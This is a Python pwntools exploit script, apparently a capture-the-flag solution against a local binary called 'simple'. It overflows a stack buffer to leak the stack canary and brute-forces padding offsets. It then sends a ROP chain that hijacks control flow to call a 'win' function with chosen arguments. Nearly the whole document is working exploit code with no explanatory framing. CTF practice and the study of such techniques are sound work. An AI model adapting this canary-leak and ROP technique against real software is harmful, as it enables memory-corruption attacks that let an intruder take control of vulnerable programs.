from pwn import *
try:
    from tqdm import tqdm
except:
    def tqdm(iter):
        return iter

context.binary = elf = ELF("./simple")
context.log_level = "warning"

# io = process()
# io.sendline(cyclic(0x256, n=8))
# io.sendline(b"quit")
# io.wait()
# offset = cyclic_find(io.corefile.fault_addr, n=8)
# io.close()
# print(stack_buf_size)
# assert stack_buf_size != -1

for offset1 in tqdm(range(8)): # stack_buf_size between stack buffer and canary
    for offset2 in range(8): # stack_buf_size between stack canary and return address
        stack_buf_size = 0x100

        with process() as io:
            # gdb.attach(io.pid)
            io.readuntil(b"> ")
            io.send(b"A" * (stack_buf_size + offset1*8 + 1))
            leak = io.readline()
            canary = b"\0" + leak[len("Nice to meet you ") + stack_buf_size + offset1*8 + 1:][:7]
            # print(f"{canary = }; {len(canary) = }")

            rop = ROP(elf)
            rop.call(elf.sym.win, [123, 321])
            payload = b'A' * stack_buf_size + pack(0)*offset1 + canary + pack(0)*offset2 + rop.chain()

            io.readuntil(b"> ")
            io.send(payload)
            io.readuntil(b"> ")
            io.sendline(b"quit")

            data = io.readall().decode('utf-8').strip()
            if "stack smashing" in data or data == "":
                continue
            print(data)
